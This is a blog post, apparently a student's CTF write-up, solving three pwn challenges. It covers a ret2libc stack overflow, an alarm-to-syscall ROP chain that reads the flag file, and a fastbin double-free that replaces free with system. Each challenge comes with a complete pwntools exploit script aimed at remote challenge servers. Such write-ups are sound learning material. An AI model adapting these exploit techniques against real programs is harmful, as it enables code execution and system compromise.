{"title":"江山三月","uid":"48372ef16aac04366888aee5595c945b","slug":"江山三月","date":"2022-03-13T11:56:30.000Z","updated":"2022-03-13T12:50:39.300Z","comments":true,"path":"api/articles/江山三月.json","keywords":null,"cover":[],"content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>新生赛，水一篇</p></blockquote>\n<h1 id=\"LIBC\"><a href=\"#LIBC\" class=\"headerlink\" title=\"LIBC\"></a>LIBC</h1><p>一道简单的栈溢出，常规的ret2libc</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;39.99.242.16&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;pwn1&#x27;</span>)</span><br><span class=\"line\">rdi = <span class=\"number\">0x40077b</span></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">puts_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">p.info(<span class=\"string\">&#x27;puts_addr==&gt;%#x&#x27;</span>,puts_addr)</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">p.info(<span class=\"string\">&#x27;libcbase==&gt;%#x&#x27;</span>,libcbase)</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">p.info(<span class=\"string\">&#x27;system_addr==&gt;%#x&#x27;</span>,system_addr)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">p.info(<span class=\"string\">&#x27;binsh_addr==&gt;%#x&#x27;</span>,binsh_addr)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;!\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"haihaihai\"><a href=\"#haihaihai\" class=\"headerlink\" title=\"haihaihai\"></a>haihaihai</h1><p>也是存在栈溢出，但是存在一个while不断循环，我们可以通过ctrl+D来停止输入，远端可以通过pwntools的shutdown功能。</p>\n<p><img src=\"https://s2.loli.net/2022/03/13/fGm7693UJyN4d1K.png\" alt=\"image.png\"></p>\n<p>停止以后我们不能再次<em>ROP</em>到主函数获取输入，因为关闭后就不能打开，除非重新运行，所以要一次性写完，这样就不能泄露地址再操作。很幸运，通过调试发现alarm+5处存在syscall，劫持GOT表执行syscall，系统调用open()打开flag文件。</p>\n<p><img src=\"https://s2.loli.net/2022/03/13/D6uVKBfUIstPxTY.png\" alt=\"image.png\"></p>\n<p>故意给出了后面</p>\n<p><img src=\"https://s2.loli.net/2022/03/13/i98teuDG4fBWcLq.png\" alt=\"image.png\"></p>\n<p>相关的gadgets</p>\n<p><img src=\"https://s2.loli.net/2022/03/13/l5kuIQYPoJTqGF2.png\" alt=\"image.png\"></p>\n<p><strong>alarm-&gt;syscall：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload &#x3D; &#39;a&#39;*0x38 # padding</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi) + p64(alarm_got)</span><br><span class=\"line\">payload +&#x3D; p64(pop_rax) + p64(0x5)</span><br><span class=\"line\">payload +&#x3D; p64(rdi_add)</span><br></pre></td></tr></table></figure>\n\n<p><strong>fd = open(“flag”,READONLY):</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload +&#x3D; p64(pop_rsi_r15) + p64(0) + p64(0)</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi) + p64(elf.search(&#39;flag&#39;).next())</span><br><span class=\"line\">payload +&#x3D; p64(pop_rax) + p64(2) # 系统调用号2</span><br><span class=\"line\">payload +&#x3D; p64(alarm_plt) # 此时alarm-&gt;syscall</span><br></pre></td></tr></table></figure>\n\n<p><strong>read(fd,stdin_addr,50)</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload +&#x3D; p64(pop_rsi_r15) + p64(stdin_addr) + p64(0)</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi) + p64(3)</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdx) + p64(100) </span><br><span class=\"line\">payload +&#x3D; p64(read_plt)</span><br></pre></td></tr></table></figure>\n\n<p><strong>printf(flag_buffer)</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload +&#x3D; p64(pop_rdi) + p64(stdin_addr) + p64(printf_plt)</span><br><span class=\"line\">payload &#x3D; payload.ljust(0x200,&#39;\\x00&#39;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn2&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;111.200.241.244&#x27;</span>,<span class=\"number\">56419</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004008a3</span></span><br><span class=\"line\">pop_rsi_r15 = <span class=\"number\">0x00000000004008a1</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x00000000004006fe</span></span><br><span class=\"line\">pop_rax = <span class=\"number\">0x00000000004006FC</span></span><br><span class=\"line\">rdi_add = <span class=\"number\">0x000000000040070d</span></span><br><span class=\"line\"></span><br><span class=\"line\">stdin_addr = <span class=\"number\">0x601070</span></span><br><span class=\"line\"></span><br><span class=\"line\">alarm_got = elf.got[<span class=\"string\">&#x27;alarm&#x27;</span>]</span><br><span class=\"line\">alarm_plt = elf.plt[<span class=\"string\">&#x27;alarm&#x27;</span>]</span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">printf_plt = elf.plt[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0x200</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">payload += p64(pop_rdi) + p64(alarm_got)</span><br><span class=\"line\">payload += p64(pop_rax) + p64(<span class=\"number\">0x5</span>)</span><br><span class=\"line\">payload += p64(rdi_add)</span><br><span class=\"line\">payload += p64(pop_rsi_r15) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rdi) + p64(elf.search(<span class=\"string\">&#x27;flag&#x27;</span>).<span class=\"built_in\">next</span>())</span><br><span class=\"line\">payload += p64(pop_rax) + p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload += p64(alarm_plt)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(pop_rsi_r15) + p64(stdin_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(pop_rdi) + p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">payload += p64(pop_rdx) + p64(<span class=\"number\">100</span>) </span><br><span class=\"line\">payload += p64(read_plt)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(pop_rdi) + p64(stdin_addr) + p64(printf_plt)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x200</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.shutdown(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fastbin-attack\"><a href=\"#fastbin-attack\" class=\"headerlink\" title=\"fastbin_attack\"></a>fastbin_attack</h1><p>程序中主要函数介绍</p>\n<ol>\n<li><p>raise<br> 这个时创建一个flower结构体，根据输入flower name的大小，分配存储name字符串的堆块，同时将flower结构体指针存放在flowerlist数组中，同时flowercount++</p>\n</li>\n<li><p>visit<br> 遍历flowerlist数组，依次输出flower的信息</p>\n</li>\n<li><p>del<br> 将对应索引的flower的name堆块free掉，同时将flowerlist[index]置为0，flowercount–</p>\n</li>\n<li><p>clean<br> 遍历flowerlist数组，将所有flower的用来存储name的堆块free掉，同时指针置为空</p>\n</li>\n</ol>\n<p><strong>利用过程：</strong></p>\n<ul>\n<li><p>通过unsorted bin泄露出libc_base，计算得到system函数和/bin/sh字符串位置</p>\n</li>\n<li><p>通过double free修改free函数为system，将带/bin/sh字符串的chunk free掉</p>\n</li>\n</ul>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./fastbin_attack&#x27;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;39.99.242.16&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x601ffa</span></span><br><span class=\"line\">magic = <span class=\"number\">0x400C7B</span></span><br><span class=\"line\">flower_list = <span class=\"number\">0x06020E0</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">name_size,name,color</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; : &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; :&#x27;</span>,<span class=\"built_in\">str</span>(name_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; :&#x27;</span>,name)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; :&#x27;</span>,color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; : &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; : &#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span>():</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27; : &#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">8</span>,<span class=\"string\">&quot;b&quot;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">8</span>,<span class=\"string\">&quot;c&quot;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">clean()</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">8</span>,<span class=\"string\">&quot;d&quot;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">leak = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&quot;\\x00&quot;</span>))</span><br><span class=\"line\">main_arena = leak+<span class=\"number\">22</span></span><br><span class=\"line\">malloc_hook = main_arena-<span class=\"number\">0x10</span></span><br><span class=\"line\">libc_base = malloc_hook-libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]</span><br><span class=\"line\">system = libc_base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts = libc_base+libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;main_arena:&quot;</span>+<span class=\"built_in\">hex</span>(main_arena)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;libc_base:&quot;</span>+<span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;malloc_hook:&quot;</span>+<span class=\"built_in\">hex</span>(malloc_hook)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">8</span>,<span class=\"string\">&quot;e&quot;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">8</span>,<span class=\"string\">&quot;f&quot;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(target),<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;cccc&#x27;</span>,<span class=\"string\">&#x27;green&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">6</span> +p64(<span class=\"number\">0</span>)+p64(system)+p64(puts),<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">6</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>参考链接：<a href=\"https://www.jianshu.com/p/1f06e40711a2\">https://www.jianshu.com/p/1f06e40711a2</a></p>\n","feature":true,"text":" 新生赛，水一篇 LIBC一道简单的栈溢出，常规的ret2libc EXP1234567891011121314151617181920212223from pwn import *from LibcSearcher import *#p = process(&#x27;./pw...","link":"","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":3,"path":"api/categories/PWN.json"}],"tags":[{"name":"write up","slug":"write-up","count":2,"path":"api/tags/write-up.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#LIBC\"><span class=\"toc-text\">LIBC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#haihaihai\"><span class=\"toc-text\">haihaihai</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#fastbin-attack\"><span class=\"toc-text\">fastbin_attack</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"破解windows10开机密码","uid":"b1f559f91ac0347fea74456e0580d181","slug":"破解windows10开机密码","date":"2022-03-11T00:56:57.000Z","updated":"2022-03-11T01:33:01.461Z","comments":true,"path":"api/articles/破解windows10开机密码.json","keywords":null,"cover":[],"text":" 利用U盘破解windows10的开机密码 简介我们平常用的windows10的开机密码会保存在系统的一个文件中，只要修改对应文件里面存储的密码就可以破解win10的开机密码 不过，这个文件正常情况下是无法打开的，但是我们可以利用U盘启动来修改它，这里我用虚拟机演示（物理机操作方...","link":"","photos":[],"count_time":{"symbolsCount":342,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"学习","slug":"学习","count":1,"path":"api/tags/学习.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}